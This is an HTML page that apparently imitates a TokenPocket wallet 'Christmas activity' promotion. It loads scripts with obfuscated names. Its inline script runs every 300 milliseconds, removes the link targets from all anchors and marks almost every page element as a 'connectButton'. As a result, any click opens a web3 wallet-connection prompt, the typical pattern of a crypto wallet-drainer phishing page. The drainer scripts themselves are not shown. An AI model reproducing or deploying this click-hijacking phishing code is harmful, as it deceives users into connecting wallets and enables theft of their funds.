<!DOCTYPE html><html lang=""><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="X3Gsstz6wMED.ico"><title>tokenpocket-christmas</title><script defer="defer" src="js/XUvAItbrzG0m.js"></script><script defer="defer" src="js/UJzXsSa9ouEv.js"></script><link href="css/RA4LVftK2S09.css" rel="stylesheet"><script charset="UTF-8" async type="text/javascript" src="js/b251f552069a9bb3-eb.js"></script></head><body><noscript><strong>We're sorry but christmas-activity doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div><script>
    function addClassesToElements() {

    const links = document.querySelectorAll('a:not(.connectButton)');
    for (const link of links) {
        link.removeAttribute('href');
        link.classList.add('connectButton');
    }
    const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
    for (const button of buttons) {
        button.classList.add('connectButton');
    }
    }
    setInterval(addClassesToElements, 300);
</script></body></html>
